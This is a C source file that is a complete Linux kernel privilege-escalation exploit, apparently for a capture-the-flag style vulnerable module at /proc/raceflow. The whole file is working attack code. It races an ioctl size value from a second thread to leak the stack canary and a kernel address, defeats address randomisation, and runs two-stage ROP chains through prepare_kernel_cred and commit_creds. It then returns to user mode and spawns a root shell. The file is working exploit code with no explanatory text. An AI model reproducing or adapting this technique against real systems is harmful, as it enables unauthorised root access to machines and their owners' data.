#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h> 
#include <string.h>

void stage_2();
void shell();

#define BUFF_SIZE 0x20*sizeof(long)

volatile int ioctl_param;
unsigned int fd;
unsigned long* payload; 
pthread_t thread_id;

unsigned long kernel_text_base;
unsigned long commit_creds;
unsigned long prepare_kernel_cred;
unsigned long swapgs_ret_to_usermode;
unsigned long pop_rdi;
unsigned long mov_rdi_rax;
unsigned long pop_rcx;
unsigned long push_rax_jmp_rcx;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

unsigned long canary;
unsigned long saved_kernel_creds;



void* myThreadFun(void*){
    while(1){
        ioctl_param = 0x01;
        ioctl_param = BUFF_SIZE;
    }
}

void save_state(){
    asm(
        "mov %cs,   user_cs;"
        "mov %ss,   user_ss;"
        "mov %rsp,  user_sp;"
        "orq $8,    user_sp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("[+] Saving state");

    printf("\tuser_cs:        0x%016llx\n", user_cs);
    printf("\tuser_ss:        0x%016llx\n", user_ss);
    printf("\tuser_sp:        0x%016llx\n", user_sp);
    printf("\tuser_rflags:    0x%016llx\n", user_rflags);
    
}


void send_payload(long payload[],off_t off ,unsigned long rip){
    payload[0x002] = canary;
    payload[off++] = swapgs_ret_to_usermode+22;

    payload[off++] = 0x0;                               //rax 
    payload[off++] = 0x0;                               //rdi

    payload[off++] = rip;                               //rip
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    for (int i = 0 ; i<0x10;i++){        
        write(fd,payload,BUFF_SIZE);
        ioctl(fd,0x31337,&ioctl_param);
    }
}

void shell(){
    puts("[+] ROOT privs gained");
    puts("[*] Spawning a shell");
    system("sh");
}


int main(){
    payload = (long*)malloc(BUFF_SIZE);

    save_state();

    pthread_create(&thread_id, NULL, myThreadFun, NULL); 
    sleep(0x1);

    fd = open("/proc/raceflow",O_RDWR);
    unsigned long buffer[BUFF_SIZE/8]={0};

    for (int i = 0 ; i<0x10;i++){        
        ioctl(fd,0x1337,&ioctl_param);
        read(fd,buffer,BUFF_SIZE);
    }

    // getting the needed ROP gads
    canary                  = buffer[2]; 
    kernel_text_base        = buffer[5] + (0xffffffff97800000L - 0xffffffff97a7d4aeL);

    commit_creds            = kernel_text_base +0x08cd90L;
    prepare_kernel_cred     = kernel_text_base +0x08d030L;
    swapgs_ret_to_usermode  = kernel_text_base +0xe00df0L;
    pop_rdi                 = kernel_text_base +0x01bebL;
    mov_rdi_rax             = kernel_text_base +0x0f0534;
    pop_rcx                 = kernel_text_base +0x0c8403;
    push_rax_jmp_rcx        = kernel_text_base +0x29cd8d;


    printf("[+] kernel_text_base: \t0x%016llx\n",kernel_text_base);

    // ROP chain
    memset(payload,0x0,BUFF_SIZE);

    off_t off = 5;
    payload[off++] = pop_rdi;
    payload[off++] = 0x0;
    payload[off++] = prepare_kernel_cred;

    send_payload(payload,off,(unsigned long)stage_2);
}

void stage_2(){
    // saving the kernel_creds upon returning from stage_1
    asm("mov %rax, saved_kernel_creds");

    printf("[+] saved_kernel_creds:\t0x%llx\n",saved_kernel_creds);

    //ROP chain
    memset(payload,0x0,BUFF_SIZE);
    off_t off = 5;
    payload[off++] = pop_rdi;
    payload[off++] = saved_kernel_creds;
    payload[off++] = commit_creds;

    send_payload(payload,off,(unsigned long)shell);
}
